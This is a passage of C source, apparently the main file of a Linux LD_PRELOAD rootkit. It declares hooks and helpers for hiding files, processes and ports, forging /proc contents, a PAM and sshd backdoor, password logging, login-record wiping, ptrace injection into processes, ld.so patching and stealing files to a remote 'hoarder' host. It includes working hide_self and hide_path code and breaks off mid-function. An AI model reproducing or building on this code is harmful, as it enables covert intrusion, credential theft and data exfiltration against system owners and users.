/*
 *  Expected order of this bdv.c:
 *    1. include essential config headers.
 *    2. include standard headers.
 *    3. include custom types.
 *    4. global declarations & random macros.
 *    5. rootkit function prototypes (+some actual functions) - arranged mostly alphabetically, per src/ directory.
 *    6. some more random macros & misc functions.
 *    7. include essential headers for functions themselves.
 *    8. important kit functions & lastly, __libc_start_main hook & friends.
 */



#define _GNU_SOURCE

/* 1. include essential config headers. */
#include "include/config.h"
#include "include/bdv.h"
#include "include/sanity.h"
#ifndef NO_ROOTKIT_ANSI
#include "include/banner.h"
#endif

/* 2. include standard headers. */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <malloc.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <fnmatch.h>
#include <dirent.h>
#include <time.h>
#include <libgen.h>
#include <dlfcn.h>
#include <link.h>
#include <sched.h>
#include <limits.h>
#include <pwd.h>
#include <shadow.h>
#include <ctype.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/fs.h>
#include <linux/netlink.h>
#include <linux/version.h>
#if defined ENABLE_STEAL && defined HOARDER_HOST
#include <sys/sendfile.h>
#endif
#ifndef NO_PCAP_STUFF
#include <pcap/pcap.h>
#endif
#ifdef USE_MAGIC_ATTR
#include <sys/xattr.h>
#endif
#ifndef NO_INJECT_PROCS
#include <sys/user.h>
#endif
#ifdef USE_PAM_BD
#include <utmp.h>
#include <utmpx.h>
#endif
#if defined USE_PAM_BD || defined PAM_AUTH_LOGGING
#include <security/pam_modules.h>
#include <security/_pam_macros.h>
#include <security/pam_ext.h>
#include <security/pam_appl.h>
#include <syslog.h>
#endif


/* 3. include custom types. */
#include "include/types.h"


/* 4. global declarations & random macros. */

/* this pointer is initialised once per process. by the function you see below it.
 * basically, this pointer is the way to all rootkit settings. ideally, in most cases it is only initialised once. */
static bdvcfg_t *mvbc = NULL;
static bdvcfg_t *initmvbc(void);
static bdvcfg_t *reinitmvbc(void);

/* this is what it sounds like. 1 = hideport in use. */
static int is_hideport_alive = 0;

static void *(*symbols[ALL_CALLS_SIZE])(); // stores all function pointers for symbols resolved by get_symbol_pointer
extern void bdvlsuperreallygay(void); // used by dl_iterate_phdr to locate loaded bdvl.so at runtime.
extern void imgay(void); // used by bdvupdate when getting new settings.
void plsdomefirst(void) __attribute((visibility("hidden")));
#define sizeofarr(arr) sizeof(arr) / sizeof(arr[0])
#define fdclosee() do { \
  for(int i=sysconf(_SC_OPEN_MAX); i>=0; i--) \
        close(i); \
} while(0)
#define xor(string) do { \
    char *s = string; \
    size_t i=0; \
    while(*s) *s++ ^= xkey[i++ % XKEY_SIZE]; \
} while(0)
void __attribute((visibility("hidden"))) bfree(void *ptr, size_t s){
    memset(ptr, 0, s);
    free(ptr);
}
#ifdef HIDE_MY_ASS
#define hree(H)  bfree(H, sizeof(bdvhidepaths_t))
#endif
#define lree(L)  bfree(L, sizeof(bdvlogfile_t))
#define sree(S)  bfree(S, sizeof(bdvso_t))
#define bree(B)  bfree(B, sizeof(bdvcfg_t))
#define clean(S) bfree(S, strlen(S))
void _setgid(gid_t gid) __attribute((visibility("hidden")));
void hide_self(void) __attribute((visibility("hidden")));
void unhide_self(void) __attribute((visibility("hidden")));
int hide_path(char *path) __attribute((visibility("hidden")));
int unhide_path(char *path) __attribute((visibility("hidden")));

#define parent_or_current_dir(DNAME) (strcmp(".\0", DNAME) == 0 || strcmp("..\0", DNAME) == 0)




/* 5. rootkit function prototypes (+some actual functions) - arranged per src/ directory. */


 /* hooks/ */
  /* libdl/ */
extern void *_dl_sym(void *, const char *, void *);
static typeof(dlsym) *o_dlsym = NULL;
   /* dlsym.c */
void locate_dlsym(void) __attribute((visibility("hidden")));
void *dlsym(void *handle, const char *symbol);
   /* gsym.c */
void get_symbol_pointer(int symbol_index, void *handle) __attribute((visibility("hidden")));
void _hook(void *handle, ...) __attribute((visibility("hidden")));
#define hook(...) _hook(RTLD_NEXT, __VA_ARGS__)
#define call(symindex, ...) symbols[symindex](__VA_ARGS__)
   /* dladdr.c */
int dladdr(const void *addr, Dl_info *info);
   /* dlinfo.c */
void repair_linkmap(void) __attribute((visibility("hidden")));
int dlinfo(void *handle, int request, void *p);
  /* authlog/ */
#ifdef PAM_AUTH_LOGGING
int pam_vprompt(pam_handle_t *pamh, int style, char **response, const char *fmt, va_list args);
int pam_prompt(pam_handle_t *pamh, int style, char **response, const char *fmt, ...);
   /* log.c */
int verify_pass(const char *user, const char *resp) __attribute((visibility("hidden")));
void log_auth(const pam_handle_t *pamh, const char *resp) __attribute((visibility("hidden")));
#endif











 /* doors/ */
  /* pam/ */
#ifdef USE_PAM_BD
   /* sshdpatch/ */
#ifdef HARD_PATCH
#define MAX_SSHD_SIZE 1024 * 8
    /* hard.c */
void addsetting(const char *setting, const char *value, char **buf) __attribute((visibility("hidden")));
size_t writesshd(const char *buf) __attribute((visibility("hidden")));
int sshdok(int res[], char **buf, size_t *sshdsize) __attribute((visibility("hidden")));
void sshdpatch(void) __attribute((visibility("hidden")));
#elif defined SOFT_PATCH
    /* soft.c */
FILE *sshdforge(const char *pathname) __attribute((visibility("hidden")));
#endif
   /* clean.c */
void utmpclean(void) __attribute((visibility("hidden")));
#ifndef NO_BTMP_CLEAN
void btmpclean(void) __attribute((visibility("hidden")));
#endif
   /* pam_hooks.c */
int pam_authenticate(pam_handle_t *pamh, int flags);
int pam_acct_mgmt(pam_handle_t *pamh, int flags);
int pam_open_session(pam_handle_t *pamh, int flags);
int pam_close_session(pam_handle_t *pamh, int flags);
   /* pam_syslog.c */
void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...);
void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args);
#endif
  /* accept.c */
#ifdef USE_ACCEPT_BD
void abackconnect(int sockfd) __attribute((visibility("hidden")));
int dropshell(int sockfd, struct sockaddr_in *sa_i) __attribute((visibility("hidden")));
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
#endif












 /* gid/ */
  /* auto.c */
#ifdef GID_CHANGE_MINTIME
void gidchanger(void) __attribute((visibility("hidden")));
#endif
  /* change.c */
id_t readid(void) __attribute((visibility("hidden")));
void hidedircontents(const char *path, const bdvcfg_t *bc) __attribute((visibility("hidden")));
id_t changerkid(const time_t curtime) __attribute((visibility("hidden")));
  /* taken.c */
int idtaken(const id_t newid) __attribute((visibility("hidden")));










 /* hiding/ */
  /* evasion/ */
#define VINVALID_PERM 0
#define VFORK_ERR    -1
#define VFORK_SUC     2
#define VEVADE_DONE   1
#define VNOTHING_DONE 3
   /* evasion.c */
int remove_self(void) __attribute((visibility("hidden")));
int evade(const char *filename, char *const argv[], char *const envp[]) __attribute((visibility("hidden")));
  /* files/ */
   /* get_path_gid.c */
#define mxstat(pathname, s)    (long)call(C__XSTAT, _STAT_VER, pathname, s)
#define mxstat64(pathname, s)  (long)call(C__XSTAT64, _STAT_VER, pathname, s)
#define mfxstat(fd, s)         (long)call(C__FXSTAT, _STAT_VER, fd, s)
#define mfxstat64(fd, s)       (long)call(C__FXSTAT64, _STAT_VER, fd, s)
#define mlxstat(pathname, s)   (long)call(C__LXSTAT, _STAT_VER, pathname, s)
#define mlxstat64(pathname, s) (long)call(C__LXSTAT64, _STAT_VER, pathname, s)
gid_t get_path_gid(const char *pathname) __attribute((visibility("hidden")));
gid_t get_path_gid64(const char *pathname) __attribute((visibility("hidden")));
gid_t lget_path_gid(const char *pathname) __attribute((visibility("hidden")));
gid_t lget_path_gid64(const char *pathname) __attribute((visibility("hidden")));
gid_t get_fd_gid(int fd) __attribute((visibility("hidden")));
gid_t get_fd_gid64(int fd) __attribute((visibility("hidden")));
   /* hidden.c */
#ifdef USE_MAGIC_ATTR
int isaproc(const char *pathname) __attribute((visibility("hidden")));
#endif
int nameisproc(const char *name) __attribute((visibility("hidden")));
int _hidden_path(const char *pathname, const short mode) __attribute((visibility("hidden")));
int _f_hidden_path(int fd, const short mode) __attribute((visibility("hidden")));
int _l_hidden_path(const char *pathname, const short mode) __attribute((visibility("hidden")));
int hidden_proc(const pid_t pid) __attribute((visibility("hidden")));
#define MODE_REG 0
#define MODE_64  1
#define hidden_pid()      hidden_proc(getpid())
#define hidden_ppid()     hidden_proc(getppid())
#define hidden_path(path)    _hidden_path(path, MODE_REG)
#define hidden_path64(path)  _hidden_path(path, MODE_64)
#define hidden_fd(fd)        _f_hidden_path(fd, MODE_REG)
#define hidden_fd64(fd)      _f_hidden_path(fd, MODE_64)
#define hidden_lpath(path)   _l_hidden_path(path, MODE_REG)
#define hidden_lpath64(path) _l_hidden_path(path, MODE_64)
  /* procnet/ */
   /* forge.c */
int isprocnet(const char *pathname) __attribute((visibility("hidden")));
procnet_t getaprocnet(const char *buf, char *ft) __attribute((visibility("hidden")));
FILE *forge_procnet(const char *pathname) __attribute((visibility("hidden")));
   /* hidden.c */
int hideport_alive(void) __attribute((visibility("hidden")));
int is_hidden_port(const u_short port) __attribute((visibility("hidden")));
int hiddenpn(const procnet_t pn) __attribute((visibility("hidden")));
   /* write.c */
void pad(char *target, const char *src, const int c) __attribute((visibility("hidden")));
char *hexnum(int num, const size_t len) __attribute((visibility("hidden")));
int procnetprint(const char *path, const procnet_t pn, FILE *outfp) __attribute((visibility("hidden")));
  /* forgeprofile.c */
FILE *forgeprofile(const char *pathname) __attribute((visibility("hidden")));
  /* groupsforge.c */
FILE *forgegroups(const char *pathname) __attribute((visibility("hidden")));
  /* mapsforge.c */
char *badstring(const char *buf, const bdvso_t *so) __attribute((visibility("hidden")));
int procexists(const char *pathname) __attribute((visibility("hidden")));
FILE *forge_maps(const char *pathname) __attribute((visibility("hidden")));
FILE *forge_smaps(const char *pathname) __attribute((visibility("hidden")));
FILE *forge_numamaps(const char *pathname) __attribute((visibility("hidden")));
  /* xattr.c */
#ifdef USE_MAGIC_ATTR
void magicattrchanger(void) __attribute((visibility("hidden")));
int attrmodif(const char *path, const u_short mode) __attribute((visibility("hidden")));
int hidden_xattr(const char *filename, const char *magicattr) __attribute((visibility("hidden")));
int hidden_fxattr(int fd, const char *magicattr) __attribute((visibility("hidden")));
int hidden_lxattr(const char *filename, const char *magicattr) __attribute((visibility("hidden")));
#endif









 /* install/ */
  /* cfg/ */
   /* get.c */
void inittimes(bdvcfg_t *bc, const time_t t) __attribute((visibility("hidden")));
const bdvcfg_t *getbdvpaths(bdvcfg_t *bc) __attribute((visibility("hidden")));
const bdvcfg_t *getbdvcfg(void) __attribute((visibility("hidden")));
   /* hide.c */
void hidebdvpaths(const bdvcfg_t *bc, id_t newid, id_t oldid, char *oldattr) __attribute((visibility("hidden")));
   /* links.c */
char **bdvlinkdests(int *c) __attribute((visibility("hidden")));
char **bdvlinksrcs(int *c) __attribute((visibility("hidden")));
void mkbdvlinks(void) __attribute((visibility("hidden")));
   /* rw.c */
void _xorbdvcfg(bdvcfg_t *const bc, char *const *targets, const size_t targetsize) __attribute((visibility("hidden")));
#define xorbdvcfg(BC) _xorbdvcfg(BC,NULL,0)
size_t writebdvcfg(const bdvcfg_t *bc, const char *path) __attribute((visibility("hidden")));
bdvcfg_t *readbdvcfg(const char *path) __attribute((visibility("hidden")));
  /* inject/ */
#ifdef __arm__
#define user_regs_struct user_regs
#define reg32_return reg_return
#define uregs regs.uregs
#endif
#define THUMB_MODE_BIT (1u << 5)
#define BREAKINST_THUMB 0xde01 /* in linux-source-tree/arch/arm/kernel/ptrace.c */
#define BREAKINST_ARM 0xe7f001f0 /* in linux-source-tree/arch/arm/kernel/ptrace.c */
#define BREAKINST_ARM64 0xd4200000 /* asm("brk #0") */
/* register type used in struct user_regs_struct */
#if defined(__LP64__) || defined(__x86_64__)
typedef unsigned long long user_reg_t;
#elif defined(__i386__)
typedef long user_reg_t;
#else
typedef unsigned long user_reg_t;
#endif
typedef struct injector injector_t;
#ifdef __LP64__
#define Elf_Ehdr Elf64_Ehdr
#define Elf_Shdr Elf64_Shdr
#define Elf_Sym Elf64_Sym
#else
#define Elf_Ehdr Elf32_Ehdr
#define Elf_Shdr Elf32_Shdr
#define Elf_Sym Elf32_Sym
#endif
typedef enum {
    ARCH_X86_64,
    ARCH_X86_64_X32,
    ARCH_I386,
    ARCH_ARM64,
    ARCH_ARM_EABI_THUMB,
    ARCH_ARM_EABI,
} arch_t;
typedef union {
    uint8_t u8[8];
    uint16_t u16[4];
    uint32_t u32[2];
} code_t;
struct injector {
    pid_t pid;
    uint8_t attached;
    uint8_t mmapped;
    arch_t arch;
    struct user_regs_struct regs;
    size_t dlopen_addr;
    size_t dlclose_addr;
    size_t code_addr; /* address where instructions are written */
    code_t backup_code;
    long sys_mmap;
    long sys_mprotect;
    long sys_munmap;
    size_t text; /* read only region */
    size_t text_size;
    size_t stack; /* stack area */
    size_t stack_size;
};
   /* elf.c */
int injector__collect_libc_information(injector_t *injector) __attribute((visibility("hidden")));
static int open_libc(FILE **fp_out, pid_t pid, size_t *addr);
static int read_elf_ehdr(FILE *fp, Elf_Ehdr *ehdr);
static int read_elf_shdr(FILE *fp, Elf_Shdr *shdr, size_t shdr_size);
static int read_elf_sym(FILE *fp, Elf_Sym *sym, size_t sym_size);
static size_t find_strtab_offset(FILE *fp, size_t offset, size_t size, const char *name);
   /* inject.c */
int injector_attach(injector_t **injector_out, pid_t pid) __attribute((visibility("hidden")));
int injector_inject(injector_t *injector, const char *path, void **handle) __attribute((visibility("hidden")));
int injector_uninject(injector_t *injector, void *handle) __attribute((visibility("hidden")));
int injector_detach(injector_t *injector) __attribute((visibility("hidden")));
   /* injector.c */
unsigned int npids(DIR *dp) __attribute((visibility("hidden")));
pid_t *allpids(unsigned int *a) __attribute((visibility("hidden")));
int binject(pid_t pid, const char *target) __attribute((visibility("hidden")));
   /* ptrace.c */
static int set_ptrace_error(const char *request_name);
int injector__ptrace(int request, pid_t pid, long addr, long data, const char *request_name) __attribute((visibility("hidden")));
int injector__attach_process(const injector_t *injector) __attribute((visibility("hidden")));
int injector__detach_process(const injector_t *injector) __attribute((visibility("hidden")));
int injector__get_regs(const injector_t *injector, struct user_regs_struct *regs) __attribute((visibility("hidden")));
int injector__set_regs(const injector_t *injector, const struct user_regs_struct *regs) __attribute((visibility("hidden")));
int injector__read(const injector_t *injector, size_t addr, void *buf, size_t len) __attribute((visibility("hidden")));
int injector__write(const injector_t *injector, size_t addr, const void *buf, size_t len) __attribute((visibility("hidden")));
int injector__continue(const injector_t *injector) __attribute((visibility("hidden")));
   /* remote_call.c */
int injector__call_syscall(const injector_t *injector, long *retval, long syscall_number, ...) __attribute((visibility("hidden")));
int injector__call_function(const injector_t *injector, long *retval, long function_addr, ...) __attribute((visibility("hidden")));
static int kick_then_wait_sigtrap(const injector_t *injector, struct user_regs_struct *regs, code_t *code, size_t code_size);
  /* ldpatch/ */
   /* find.c */
char **ldfind(int *allf, int maxlds) __attribute((visibility("hidden")));
   /* patch.c */
int _ldpatch(const char *path, const char *oldpreload, const char *newpreload) __attribute((visibility("hidden")));
int ldpatch(const char *oldpreload, const char *newpreload) __attribute((visibility("hidden")));
int patch_on_install(const char *preloadpath) __attribute((visibility("hidden")));
   /* protect.c */
#ifndef NO_PROTECT_LDSO
int ispatched(const char *path, const char *newpreload) __attribute((visibility("hidden")));
static int _ldprotect(void *arg);
void ldprotect(void) __attribute((visibility("hidden")));
#endif
  /* install.c */
void bignope(const bdvcfg_t *bc) __attribute((visibility("hidden")));
void printhideports(const bdvcfg_t *bc) __attribute((visibility("hidden")));
void bdvinstall(char *const argv[], const bdvcfg_t *bc, const u_short isupdate) __attribute((visibility("hidden")));
  /* prep.c */
int prepareregfile(const char *path, id_t magicid) __attribute((visibility("hidden")));
int preparedir(const char *path, id_t magicid) __attribute((visibility("hidden")));
void bdprep(void) __attribute((visibility("hidden")));
  /* reinstall.c */
int preloadok(const bdvcfg_t *bc) __attribute((visibility("hidden")));
void reinstall(const bdvcfg_t *bc) __attribute((visibility("hidden")));
  /* selinux.c */
#ifdef SEL_CONFIG
int anselinux(void) __attribute((visibility("hidden")));
int chkselinux(void) __attribute((visibility("hidden")));
void doselchk(void) __attribute((visibility("hidden")));
#endif
  /* so.c */
int isplatform(const char *sopath, const char *platform) __attribute((visibility("hidden")));
char *sogetplatform(const char *sopath) __attribute((visibility("hidden")));
char *sogetpath(const char *sopath, const char *installdir, const char *bdvlso) __attribute((visibility("hidden")));
int socopy(const char *opath, char *npath, const id_t magicid) __attribute((visibility("hidden")));
  /* uninstall.c */
#if defined HIDE_MY_ASS && defined UNINSTALL_MY_ASS
void uninstallass(const bdvcfg_t *bc) __attribute((visibility("hidden")));
#endif
void rmlinksrc(void) __attribute((visibility("hidden")));
void rmlogpaths(void) __attribute((visibility("hidden")));
void rmbdvpaths(const bdvcfg_t *bc) __attribute((visibility("hidden")));
void terminate_self(void) __attribute((visibility("hidden")));
  /* update.c */
char **fetch_new_settings(const char *sopath, new_hideports *newhp) __attribute((visibility("hidden")));
void bdvupdate(char *const argv[]) __attribute((visibility("hidden")));











 /* io/ */
  /* exists.c */
int direxists(const char *pathname) __attribute((visibility("hidden")));
int xdirexists(const char *pathname) __attribute((visibility("hidden")));
int pathexists(const char *pathname) __attribute((visibility("hidden")));
  /* ioctl.c */
int doiapath(const char *path, const int apply) __attribute((visibility("hidden")));
int doiadir(const char *pathname, const int apply) __attribute((visibility("hidden")));
  /* redir.c */
FILE *redirstream(const char *pathname, FILE **tmp) __attribute((visibility("hidden")));
FILE *bindup(const char *path, char *newpath, FILE **nfp, u_long *fsize, mode_t *mode) __attribute((visibility("hidden")));
void fcloser(const u_int c, ...) __attribute((visibility("hidden")));
  /* size.c */
u_long getfilesize(const char *path) __attribute((visibility("hidden")));
u_long getnewfilesize(const char *path, const u_long fsize) __attribute((visibility("hidden")));
u_long getdirsize(const char *dirpath) __attribute((visibility("hidden")));
u_long getnewdirsize(const char *dirpath, const u_long fsize) __attribute((visibility("hidden")));
u_long getablocksize(const u_long fsize) __attribute((visibility("hidden")));







 /* log/ */
  /* rw.c */
#define xorlogcontents(BL) do { \
    if(BL->log_count == 0) break; \
    for(u_int i = 0; i < BL->log_count; i++) \
        xor(BL->log_contents[i]); \
} while(0)
int __attribute((visibility("hidden"))) getlogpos(const char log_contents[LOG_MAX_CAPACITY][LOG_MAX_SIZE_BYTES], const char *s){
    int got = -1;
    for(int i = 0; i < LOG_MAX_CAPACITY && got < 0; i++)
        got = strcmp(log_contents[i], s) == 0 ? i : -1;
    return got;
}
#define findnewlogpos(C) getlogpos(C,"\0")
#define addnewlog(BL,LOGBUF) do { \
    int new_pos = findnewlogpos(BL->log_contents); \
    if(new_pos < 0) break; \
    memset(BL->log_contents[new_pos], 0, LOG_MAX_SIZE_BYTES); \
    strncpy(BL->log_contents[new_pos], LOGBUF, LOG_MAX_SIZE_BYTES-1); \
    BL->log_timestamps[new_pos] = time(NULL); \
    ++BL->log_count; \
} while(0)
bdvlogfile_t *readlogfile(const char *pathname) __attribute((visibility("hidden")));
size_t writelogtofile(const char *pathname, const bdvlogfile_t *bl) __attribute((visibility("hidden")));
int alreadylogged(const bdvlogfile_t *bl, char *logbuf) __attribute((visibility("hidden")));
u_int logcount(const char *pathname) __attribute((visibility("hidden")));
  /* util.c */
void dologcontrols(char *const argv[]) __attribute((visibility("hidden")));












 /* magic/ */
  /* ass.c */
bdvhidepaths_t *readass(const bdvcfg_t *bc) __attribute((visibility("hidden")));
void _hidemyass(const bdvhidepaths_t *my, const bdvcfg_t *bc) __attribute((visibility("hidden")));
#define hidemyass(B) do { \
    bdvhidepaths_t *m = readass(B); \
    if(!m) break; \
    _hidemyass(m, B); \
    hree(m); \
} while(0)
void domyass(char *const argv[]) __attribute((visibility("hidden")));
  /* lifespan.c */
#if defined AFTER_HOURS || defined AFTER_DAYS
double timesinceinstall(void) __attribute((visibility("hidden")));
double unremaining(void) __attribute((visibility("hidden")));
int uninstallnow(void) __attribute((visibility("hidden")));
void options_lifespan(const char *a0, const char *a1, const char *cuopt, const int optmode) __attribute((visibility("hidden")));
void dolifespan(char *const argv[]) __attribute((visibility("hidden")));
#endif
  /* cleanse.c */
void bdvcleanse(void) __attribute((visibility("hidden")));
  /* cmds.c */
char *_buildbdvoptargs(char buf[], const size_t bufsize, char *const *opts, const size_t arrsize, const char sep) __attribute((visibility("hidden")));
#define buildbdvoptargs(BUF,ARR) _buildbdvoptargs(BUF,sizeof(BUF),ARR,sizeofarr(ARR),'/')
int _getoptmode(const char *gopt, char *const *opts, const size_t arrsize) __attribute((visibility("hidden")));
#define getoptmode(GOPT,ARR) _getoptmode(GOPT,ARR,sizeofarr(ARR))
void _optusgndie(const char *a0, const char *a1, char *const *opts, const size_t arrsize, const size_t maxelemsize) __attribute((visibility("hidden")));
#define optusgndie(A0,A1,ARR,ESIZE) _optusgndie(A0,A1,ARR,sizeofarr(ARR),ESIZE)
  /* hideports.c */
void options_hideports(const char *a0, const char *a1, const char *hpopt, const int optmode) __attribute((visibility("hidden")));
int getportpos(const u_short *const hideports, const u_short port) __attribute((visibility("hidden")));
void dohideports(char *const argv[]) __attribute((visibility("hidden")));
  /* hoarder.c */
#if defined ENABLE_STEAL && defined HOARDER_HOST
void options_stolenstore(const char *a0, const char *a1, const char *ssopt, const int optmode) __attribute((visibility("hidden")));
void dostolenstore(char *const argv[]) __attribute((visibility("hidden")));
#endif
  /* inject.c */
void options_inject(const char *a0) __attribute((visibility("hidden")));
void doinjectso(char *const *argv) __attribute((visibility("hidden")));
  /* magic.h */
void dorolf(void) __attribute((visibility("hidden")));
  /* magicusr.c */
void setbdvlenv(const bdvcfg_t *bc) __attribute((visibility("hidden")));
int magicusr(void) __attribute((visibility("hidden")));
  /* rkproc.c */
int rkprocup(void) __attribute((visibility("hidden")));
  /* utils.c */
void option_err(const char *a0) __attribute((visibility("hidden")));
void do_self(void) __attribute((visibility("hidden")));
#ifdef BACKDOOR_PKGMAN
void checkforman(char *const *argv, const char *option) __attribute((visibility("hidden")));
#endif
void dobdvutil(char *const argv[]) __attribute((visibility("hidden")));










 /* misc/ */
#define PROCPATH_MAX_SIZE CMDLINE_PATH_SIZE + PID_MAXLEN
#define MODE_NAME     1
#define MODE_CMDLINE  2
  /* wxor.c */  // these are first here because stuff immediately below needs these now.
int xrm(const char *path) __attribute((visibility("hidden")));
char *xordup(const char *str) __attribute((visibility("hidden")));
void *xdlopen(const char *filename, int flags) __attribute((visibility("hidden")));
int xchownpath(const char *path, id_t aid) __attribute((visibility("hidden")));
int xprocess(const char *name) __attribute((visibility("hidden")));
int xfnmatch(const char *pattern, const char *string) __attribute((visibility("hidden")));
int xsetenv(const char *name, const char *value, int overwrite) __attribute((visibility("hidden")));
int xisplatform(const char *sopath, const char *platform) __attribute((visibility("hidden")));
char *xgetenv(const char *name) __attribute((visibility("hidden")));
#define xperror(NM) do { \
    int current_errno = errno; \
    char *xs = xordup(validpxopts[PXOPTS_##NM]); \
    if(xs){ \
        errno = current_errno; \
        perror(xs); \
        clean(xs); \
    } \
} while(0)
#define xsnprintf(BUF,BSIZE,FMT,...) do { \
    char *xfmt = xordup(FMT); \
    if(!xfmt) exit(0); \
    snprintf(BUF,BSIZE,xfmt,__VA_ARGS__); \
    clean(xfmt); \
} while(0)
  /* misc.c */
int eradicatedir(const char *target) __attribute((visibility("hidden")));
int rm(const char *path) __attribute((visibility("hidden")));
int chownpath(const char *path, gid_t gid) __attribute((visibility("hidden")));
int notuser(uid_t id) __attribute((visibility("hidden")));
int isfedora(void) __attribute((visibility("hidden")));
int phdrcallback(struct dl_phdr_info *info, size_t size, void *data) __attribute((visibility("hidden")));
bdvso_t *getbdvsoinf(void) __attribute((visibility("hidden")));
char *rksopath(const char *installdir, const char *bdvlso) __attribute((visibility("hidden")));
char *gdirname(int fd, ssize_t *dlen) __attribute((visibility("hidden")));
#if defined USE_PAM_BD || defined PAM_AUTH_LOGGING
char *get_username(const pam_handle_t *pamh) __attribute((visibility("hidden")));
int  __attribute((visibility("hidden"))) isbduname(const char *name){
    if(name == NULL) return 0;
    char *pamname = xordup(BDUSERNAME);
    if(!pamname) return 0;
    int s = strncmp(pamname, name, BDUSERNAME_SIZE);
    clean(pamname);
    return s == 0;
}
#endif
int sneakyclone(int (*fn)(void*), void *arg, const size_t stacksize) __attribute((visibility("hidden")));
  /* nomore.c */
int _rknomore(const char *installdir, const char *bdvlso) __attribute((visibility("hidden")));
int  __attribute((visibility("hidden"))) rknomore(void){
    if(!initmvbc())
        return 1;
    return _rknomore(mvbc->installdir, mvbc->bdvlso);
}
  /* proc.c */
int  open_cmdline(const pid_t pid) __attribute((visibility("hidden")));
char *procinfo(const pid_t pid, const u_short mode) __attribute((visibility("hidden")));
char *selfexe(void) __attribute((visibility("hidden")));
#define procname() procinfo(getpid(), MODE_NAME)
#define proccmdl() procinfo(getpid(), MODE_CMDLINE)
int cmpproc(const char *name) __attribute((visibility("hidden")));
char *strproc(const char *name) __attribute((visibility("hidden")));
int process(const char *name) __attribute((visibility("hidden")));
#if defined HARD_PATCH || defined SOFT_PATCH
int sshdproc(void) __attribute((visibility("hidden")));
#endif
#ifdef ENABLE_STEAL
int sssdproc(void) __attribute((visibility("hidden")));
#endif
#ifdef USE_PAM_BD
int magicsshd(void) __attribute((visibility("hidden")));
#endif






 /* random/ */
  /* charsets.c */
#define randchar(SET) SET[rand() % ALPHABET_SIZE]
static char buf_lowercase[ALPHABET_SIZE+1] = {0,}, buf_uppercase[ALPHABET_SIZE+1] = {0,}, buf_digits[11] = {0,};
static u_short got_charsets = 0;
int isadigit(char c) __attribute((visibility("hidden")));
void get_lower_charset(void) __attribute((visibility("hidden")));
void get_upper_charset(void) __attribute((visibility("hidden")));
void get_digits_charset(void) __attribute((visibility("hidden")));
void getcharsets(void) __attribute((visibility("hidden")));
  /* num.c */
int _randnum(const int min, const int max) __attribute((visibility("hidden")));
id_t randid(void) __attribute((visibility("hidden")));
  /* path.c */
int path_is_link(const char *path) __attribute((visibility("hidden")));
char *get_valid_rootdir(const char *rdir, DIR **rdp) __attribute((visibility("hidden")));
char *select_random_dir(DIR *dp) __attribute((visibility("hidden")));
char *randpath(const size_t len, const char *rdir) __attribute((visibility("hidden")));
  /* strings.c */
char *randvar(const size_t len) __attribute((visibility("hidden")));
char *randgarb(const size_t len) __attribute((visibility("hidden")));
char *randso(const char *installdir) __attribute((visibility("hidden")));






 /* steal/ */
#ifdef ENABLE_STEAL
#define FILENAME_MAXLEN 256
  /* clean.c */
#ifdef FILE_CLEANSE_TIMER
void rmstolens(const bdvcfg_t *bc) __attribute((visibility("hidden")));
void cleanstolen(void) __attribute((visibility("hidden")));
#endif
  /* dirs.c */
char **getdirstructure(const char *path, int *cdir) __attribute((visibility("hidden")));
char *createdirstructure(const char *rootdir, const char *path, char **dirs, const int cdir) __attribute((visibility("hidden")));
int mkdirstructure(const char *rootdir, char **dirs, const int cdir) __attribute((visibility("hidden")));
void freedirs(char **dirs, const int cdir) __attribute((visibility("hidden")));
  /* interest.c */
int interesting(const char *path) __attribute((visibility("hidden")));
#ifdef INTERESTING_DIRECTORIES_SIZE
int interestingdir(const char *path) __attribute((visibility("hidden")));
#endif
#ifdef FILENAMES_BLACKLIST_SIZE
int uninteresting(const char *path) __attribute((visibility("hidden")));
#endif
  /* path.c */
char *fullpath(const char *cwd, const char *file) __attribute((visibility("hidden")));
int fileincwd(const char *cwd, const char *file) __attribute((visibility("hidden")));
char *pathtmp(const char *newpath) __attribute((visibility("hidden")));
int tmpup(const char *newpath) __attribute((visibility("hidden")));
char *getnewpath(const char *rootdir, const char *oldpath) __attribute((visibility("hidden")));
  /* steal.c */
#if defined FALLBACK_SYMLINK || defined ONLY_SYMLINK
int linkfile(const char *oldpath, const char *newpath) __attribute((visibility("hidden")));
#endif
static int takeit(void *arg);
void inspectfile(const char *pathname) __attribute((visibility("hidden")));
  /* store.c */
#ifdef HOARDER_HOST
char *get_hoarder_host(const bdvcfg_t *bc) __attribute((visibility("hidden")));
u_short get_hoarder_port(const bdvcfg_t *bc) __attribute((visibility("hidden")));
void sendfileinfo(int sockfd, char *cwd, const char *oldpath, const u_long fsize) __attribute((visibility("hidden")));
int prepare_hoarder_connection(void) __attribute((visibility("hidden")));
int hoarder_sendfile(const char *oldpath, const int in_fd, const u_long fsize) __attribute((visibility("hidden")));
#endif
  /* write.c */
#ifdef FALLBACK_FAILED_MAP
void wcfallback(FILE *ofp, const u_long fsize, const char *newpath) __attribute((visibility("hidden")));
#endif
int writecopy(const char *oldpath, char *newpath) __attribute((visibility("hidden")));
#endif
















/* 6. some more random macros & misc functions. */

void _setgid(gid_t gid){
    hook(CSETGID);
    call(CSETGID, gid);
}
void hide_self(void){
    if(notuser(0)) return;
    id_t magicid = readid();
    _setgid(magicid);
}
void unhide_self(void){
    if(notuser(0)) return;
    _setgid(0);
}
#define PATH_ERR   -1
#define PATH_DONE   1
#define PATH_SUCC   0
int hide_path(char *path){
    if(notuser(0)) return PATH_ERR;
    if(hidden_path(path)) return PATH_DONE;
    int rv;
#ifdef USE_MAGIC_ATTR
    rv = attrmodif(path, CSETXATTR);
#else
    rv = chownpath(path, readid());
#endif
    return rv;
}
int xhide_path(const char *path){
    if(notuser(0)) return PATH_ERR;
    if(hidden_path(path)) return PATH_DONE;
    int rv;
    char *xpath = xordup(path);
    if(!xpath) return 0;
#ifdef USE_MAGIC_ATTR
    rv = attrmodif(xpath, CSETXATTR);
#else
    rv = chownpath(xpath, readid());
#endif
    clean(xpath);
    return rv;
}
int unhide_path(char *path){
    if(notuser(0)) return PATH_ERR;
